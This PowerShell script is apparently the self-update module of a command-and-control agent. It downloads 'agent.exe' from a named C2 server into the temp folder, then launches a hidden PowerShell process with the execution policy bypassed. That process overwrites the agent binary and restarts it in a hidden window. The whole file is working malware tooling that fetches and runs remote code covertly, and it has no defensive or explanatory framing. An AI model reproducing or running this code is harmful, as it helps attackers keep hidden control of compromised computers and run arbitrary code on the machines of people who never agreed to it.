param($args)

$agentPath = $env:AgentPath
if (-not $agentPath) {
    Write-Output "❌ AgentPath environment variable not set."
    exit
}

$c2BaseUrl = "https://c2-serverv2-qxvl.onrender.com"  # Your C2 URL
$updateUrl = "$c2BaseUrl/agent.exe"
$tempFile = "$env:TEMP\agent_new.exe"

Write-Output "[*] Downloading latest agent from $updateUrl..."

try {
    Invoke-WebRequest -Uri $updateUrl -OutFile $tempFile -ErrorAction Stop
} catch {
    Write-Output "❌ Download failed: $_"
    exit
}

if (-not (Test-Path $tempFile) -or (Get-Item $tempFile).Length -eq 0) {
    Write-Output "❌ Downloaded file is invalid."
    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
    exit
}

Write-Output "[+] Download complete. Preparing update..."

# PowerShell script that waits, replaces, and restarts
$updateScript = @"
Start-Sleep -Seconds 2
Copy-Item -Path '$tempFile' -Destination '$agentPath' -Force
Remove-Item -Path '$tempFile' -Force
Start-Process -WindowStyle Hidden -FilePath '$agentPath'
"@

# Launch the update script in a hidden PowerShell process
Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$updateScript`""

Write-Output "[+] Update initiated. Agent will restart in a moment. Goodbye."
Start-Sleep -Seconds 1